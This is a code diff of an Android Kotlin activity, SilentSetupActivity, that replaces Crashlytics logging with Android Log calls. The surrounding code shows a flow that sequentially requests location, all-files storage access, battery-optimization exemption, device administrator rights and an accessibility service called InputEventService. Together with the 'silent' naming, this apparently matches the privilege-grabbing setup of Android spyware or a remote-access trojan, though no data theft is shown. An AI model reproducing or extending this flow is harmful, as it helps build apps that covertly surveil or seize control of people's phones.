@@ -15,17 +15,16 @@ import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.text.TextUtils
+import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import com.google.firebase.crashlytics.FirebaseCrashlytics
 
 class SilentSetupActivity : AppCompatActivity() {
 
     private val handler = Handler(Looper.getMainLooper())
     private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
     private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
-    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }
 
     private val permissions = mutableListOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
@@ -41,7 +40,7 @@ class SilentSetupActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        crashlytics.log("SilentSetupActivity: onCreate")
+        Log.d("SilentSetup", "onCreate")
         requestNextPermission()
     }
 
@@ -62,12 +61,12 @@ class SilentSetupActivity : AppCompatActivity() {
         }
 
         val perm = permissions[permissionIndex]
-        crashlytics.log("SilentSetupActivity: requesting permission[$permissionIndex] = $perm")
+        Log.d("SilentSetup", "requesting permission[$permissionIndex] = $perm")
 
         try {
             ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
         } catch (e: Exception) {
-            crashlytics.recordException(e)
+            Log.w("SilentSetup", "requestPermissions error", e)
             permissionIndex++
             handler.postDelayed({ requestNextPermission() }, 300)
         }
@@ -80,7 +79,7 @@ class SilentSetupActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
-        crashlytics.log("SilentSetupActivity: permissionResult[$requestCode] granted=$granted")
+        Log.d("SilentSetup", "permissionResult[$requestCode] granted=$granted")
         permissionIndex++
         handler.postDelayed({ requestNextPermission() }, 300)
     }
@@ -88,7 +87,7 @@ class SilentSetupActivity : AppCompatActivity() {
     // ── Storage ──────────────────────────────────────────────────────────────
 
     private fun requestSpecialPermissions() {
-        crashlytics.log("SilentSetupActivity: requestSpecialPermissions")
+        Log.d("SilentSetup", "requestSpecialPermissions")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
             try {
                 @Suppress("DEPRECATION")
@@ -99,7 +98,7 @@ class SilentSetupActivity : AppCompatActivity() {
                 )
                 return
             } catch (e: Exception) {
-                crashlytics.recordException(e)
+                Log.w("SilentSetup", "requestSpecialPermissions error", e)
             }
         }
         requestBatteryOptimization()
@@ -108,7 +107,7 @@ class SilentSetupActivity : AppCompatActivity() {
     // ── Battery optimization ─────────────────────────────────────────────────
 
     private fun requestBatteryOptimization() {
-        crashlytics.log("SilentSetupActivity: requestBatteryOptimization")
+        Log.d("SilentSetup", "requestBatteryOptimization")
         val pm = getSystemService(PowerManager::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
             !pm.isIgnoringBatteryOptimizations(packageName)) {
@@ -121,7 +120,7 @@ class SilentSetupActivity : AppCompatActivity() {
                 )
                 return
             } catch (e: Exception) {
-                crashlytics.recordException(e)
+                Log.w("SilentSetup", "requestBatteryOptimization error", e)
             }
         }
         requestDeviceAdmin()
@@ -130,7 +129,7 @@ class SilentSetupActivity : AppCompatActivity() {
     // ── Device Admin ─────────────────────────────────────────────────────────
 
     private fun requestDeviceAdmin() {
-        crashlytics.log("SilentSetupActivity: requestDeviceAdmin")
+        Log.d("SilentSetup", "requestDeviceAdmin")
         if (!dpm.isAdminActive(adminComponent)) {
             try {
                 @Suppress("DEPRECATION")
@@ -142,7 +141,7 @@ class SilentSetupActivity : AppCompatActivity() {
                 )
                 return
             } catch (e: Exception) {
-                crashlytics.recordException(e)
+                Log.w("SilentSetup", "requestDeviceAdmin error", e)
             }
         }
         requestAccessibility()
@@ -165,13 +164,13 @@ class SilentSetupActivity : AppCompatActivity() {
             }
             false
         } catch (e: Exception) {
-            crashlytics.recordException(e)
+            Log.w("SilentSetup", "isAccessibilityEnabled error", e)
             false
         }
     }
 
     private fun requestAccessibility() {
-        crashlytics.log("SilentSetupActivity: requestAccessibility")
+        Log.d("SilentSetup", "requestAccessibility")
         if (!isAccessibilityEnabled(InputEventService::class.java)) {
             try {
                 @Suppress("DEPRECATION")
@@ -180,7 +179,7 @@ class SilentSetupActivity : AppCompatActivity() {
                 )
                 return
             } catch (e: Exception) {
-                crashlytics.recordException(e)
+                Log.w("SilentSetup", "requestAccessibility error", e)
             }
         }
         finishSetup()
@@ -191,7 +190,7 @@ class SilentSetupActivity : AppCompatActivity() {
     @Suppress("DEPRECATION")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        crashlytics.log("SilentSetupActivity: onActivityResult requestCode=$requestCode resultCode=$resultCode")
+        Log.d("SilentSetup", "onActivityResult requestCode=$requestCode resultCode=$resultCode")
         handler.postDelayed({
             when (requestCode) {
                 2001 -> requestBatteryOptimization()
@@ -206,13 +205,13 @@ class SilentSetupActivity : AppCompatActivity() {
     // ── Finish ───────────────────────────────────────────────────────────────
 
     private fun finishSetup() {
-        crashlytics.log("SilentSetupActivity: finishSetup → launching MatrixSuccessActivity")
+        Log.d("SilentSetup", "finishSetup → launching MatrixSuccessActivity")
         getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
             .edit().putBoolean("setup_done", true).apply()
         try {
             startActivity(Intent(this, MatrixSuccessActivity::class.java))
         } catch (e: Exception) {
-            crashlytics.recordException(e)
+            Log.w("SilentSetup", "finishSetup error", e)
         }
         finish()
     }
